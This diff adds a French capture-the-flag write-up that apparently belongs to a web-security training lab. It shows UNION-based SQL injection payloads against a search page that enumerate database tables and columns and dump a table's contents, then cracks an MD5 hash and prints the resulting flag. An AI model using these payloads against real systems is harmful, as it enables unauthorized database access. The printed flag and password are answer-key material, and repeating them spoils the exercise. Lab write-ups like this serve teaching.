@@ -1,0 +1,47 @@
+Flag 9 - SQL Injection UNION
+
+On se rend à la page : http://192.168.1.47/index.php?page=searchimg
+
+J'ai testé :
+
+1 OR 1=1
+
+On a plusieurs lignes avec Tilte, Url...
+<img width="1270" height="882" alt="Image" src="https://github.com/user-attachments/assets/353626b5-b96a-4b78-8322-08f956448155" />
+
+On utilise maintenant UNION pour lister les tables :
+
+1 OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables
+
+On a bien lister les tables de la bdd.
+
+On va lister la table qui nous interesse : list_images.
+
+On va interroger information_schema.columns :
+
+1 OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns
+
+Maintenant on connait la table et ses colonnes, on va lire son contenu.
+
+On doit respecter le fait que la page affiche 2 colonnes (Title / Url), donc on renvoie 2 valeurs dans le SELECT.
+
+On va mettre l’id en premier, et un CONCAT de url, title, comment en deuxième :
+
+1 OR 1=1 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
+<img width="1698" height="752" alt="Image" src="https://github.com/user-attachments/assets/6c2eb51a-3c71-4753-9fb1-a4be731aefad" />
+
+Le message nous dit : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+Ce qui nous indique la marche à suivre pour trouver le flag
+
+On décode le hash MD5 :
+<img width="1426" height="669" alt="Image" src="https://github.com/user-attachments/assets/f8ff1e03-4c4c-4516-a505-1694b99c8552" />
+
+Enfin pour hasher "albatroz" en SHA256, on utilise :
+
+echo -n "albatroz" | sha256sum
+
+Ce qui nous donne le flag :
+
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+<img width="611" height="47" alt="Image" src="https://github.com/user-attachments/assets/d9ea2bdc-7a84-4f03-8ccb-4e8dd3549e17" />
